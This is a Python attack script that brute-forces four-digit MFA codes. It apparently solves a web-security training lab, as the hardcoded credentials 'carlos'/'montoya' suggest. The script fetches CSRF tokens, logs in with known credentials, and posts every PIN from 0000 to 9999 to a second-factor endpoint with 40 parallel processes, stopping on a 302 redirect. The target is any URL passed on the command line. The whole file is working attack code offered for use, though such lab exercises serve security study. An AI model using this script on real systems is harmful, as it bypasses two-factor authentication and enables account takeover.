import requests
import sys
from bs4 import BeautifulSoup
import multiprocessing

def generatePins():
    """
    This method generates four digit MFA codes ranging from
    0000 to 9999, which is the range where the answer pin exists in.
    This method loops from 0 to 2000 and converts those integers to
    a string, then it appends 0s up to four places to the left of the integer.
    These generated strings of pins are stored global pins lists.
    This method takes no arguments.
    """
    global pins1
    global pins2
    global pins3
    global pins4
    global pins5
    global pins6
    global pins7
    global pins8
    global pins9
    i = 0
    while(i <= 1000):
        pins1.append(str(i).zfill(4))
        i += 1

    while(i <= 2000):
        pins2.append(str(i).zfill(4))
        i += 1

    while(i <= 3000):
        pins3.append(str(i).zfill(4))
        i += 1

    while(i <= 4000):
        pins4.append(str(i).zfill(4))
        i += 1

    while(i <= 5000):
        pins5.append(str(i).zfill(4))
        i += 1

    while(i <= 6000):
        pins6.append(str(i).zfill(4))
        i += 1

    while(i <= 7000):
        pins7.append(str(i).zfill(4))
        i += 1

    while(i <= 8000):
        pins8.append(str(i).zfill(4))
        i += 1

    while(i <= 9999):
        pins9.append(str(i).zfill(4))
        i += 1


def main():

    """
    args:
        None passed in, takes command line argument which is the URL of the level.
    Returns:
        None

    Here I am defining my global variables. 'pins1' through 'pins9' are the global
    shared lists of potential four digit pins, one of which is the 
    answer. The global variable 'event' is a multiprocessing event
    which will be used to kill all the pool workers when it is set. This event
    is set when one process finds the correct pin. The global 'site' is 
    a shared string between processes which is used as part of the url for
    logging into the vulnerable website.
    """
    global pins1
    global pins2
    global pins3
    global pins4
    global pins5
    global pins6
    global pins7
    global pins8
    global pins9
    global event
    global site
    
    # The site in question is extracted from the command line argument on program
    # start. The leading 'https://' if it exists is stripped from the url argument.
    site = sys.argv[1]
    if 'https://' in site:
       site = site.rstrip('/').lstrip('https://')

    # This if statement only executes if the main thread is running. It will
    # prevent pool threads/processes from reinitializing these global variables.
    # This if statement performs the initialization of critical global variables.
    if __name__ == '__main__':
        print("The program is running. It will display the correct mfa code when it is found.")
        pins1 = []
        pins2 = []
        pins3 = []
        pins4 = []
        pins5 = []
        pins6 = []
        pins7 = []
        pins8 = []
        pins9 = []
        event = multiprocessing.Event()
    
        # global pins lists are filled.
        generatePins()

        # Here a pool of 40 processes is initialized for later use of brute forcing testing
        # MFA pins.
        p = multiprocessing.Pool(40)

        # This loop executes the brute forcing attack until the event is set. When the event is 
        # set, it indicates that the correct pin has been found and the pool workers need to stop
        # execution. The brute force mapping is done about 1000 pins at a time starting with 0000-1000
        # then moving to 1001-2000, and so on. The correct pin is generally under 3000 so it makes sense to 
        # first search the lower number where the pin is most likely to be. 
        while event.is_set() == False:
            try:
                p.map(bruteForceMFA, pins1)
                p.map(bruteForceMFA, pins2)
                p.map(bruteForceMFA, pins3)
                p.map(bruteForceMFA, pins4)
                p.map(bruteForceMFA, pins5)
                p.map(bruteForceMFA, pins6)
                p.map(bruteForceMFA, pins7)
                p.map(bruteForceMFA, pins8)
                p.map(bruteForceMFA, pins9)

                p.close()
                p.join()
            except:
                p.close()
                p.join()
                print("Unable to find a valid mfa code in the range 0000-9999.")
            

def bruteForceMFA(pin):
    """
    args:
        (str): pin
    returns:
        None

    The sole argument is a single pin from one of the global pins lists which is processed
    by a pool thread.
    """

    # Here I declare that the variable 'event' is a global event and the program
    # should use its prior declaration.
    global event

    # If the event is set then no work needs to be done since the answer was found
    # the pool process should return.
    if(event.is_set() == True):
        return

    # If the event is NOT set then the thread should perform an initial login to get 
    # a valid csrf.
    initLogin(pin)
    

def initLogin(pin):

    """
    args:
        (str): pin
    Returns:
        None
    
    The sole argument 'pin' is a single four digit code in a string format. It
    is going to be posted to the MFA input element to see if we can login.
    """

    # establish a new session, initialize the desired url value, and perform a GET
    # on the desired page.
    s = requests.Session()
    login_url = f'https://{site}/login'
    resp = s.get(login_url)

    # From the response, parse the html and extract the csrf 'code'
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')

    # package up the valid, given username and password. Then insert the csrf 'code
    # from the GET response from the website.
    logindata = {
        'csrf' : csrf,
        'username' : 'carlos',
        'password' : 'montoya'
    }

    # This line performs the initial login step. 
    resp = s.post(login_url, data=logindata)

    # Take the response from the login step and extract a new csrf value.
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')

    # To test the MFA code, pass the csrf from the login, the four digit pin delegated
    # to this process, and the session from this thread into the secondaryLogin method.
    secondaryLogin(pin, csrf, s)
    

def secondaryLogin(pin, csrf, s):
    """
    Args:
        (str): pin
        (str): csrf
        (session): s
    Returns:
        None

    This method takes three arguments. The 'pin' is the four digit string to be
    tested as the MFA code. The 'csrf' is a string token which 'tells' the server that
    my request is a valid one and the server accepts the incoming request. The argument 's'
    is a session object that handles sending requests. 
    """

    # declaring that I am using 'event' and 'site' as global variables, so I should
    # use their prior declarations.
    global event
    global site

    # If the event is set then this process has no work to perform and so it should return
    if(event.is_set() == True):
        return


    # Here I am packaging up the url for the MFA code page. The object uses the 
    # passed in csrf from the initial login and it uses the passed in pin as the 
    # mfa-code
    login2_url = f'https://{site}/login2'
    login2data = {
        'csrf' : csrf,
        'mfa-code' : pin
    }

    # Attempt posting the MFA code and wait for return status.
    resp = s.post(login2_url, data=login2data, allow_redirects=False)

    # If the response status is a 302 then I know that I have found the correct
    # MFA code. Set the event 'flag' to notify other processes to stop. Print
    # diagnostic information and the pin which was the answer. 
    if resp.status_code == 302:
        event.set()
        print(f'2fa valid with response code {resp.status_code}')
        print(f"The valid mfa code was: {pin}")


main()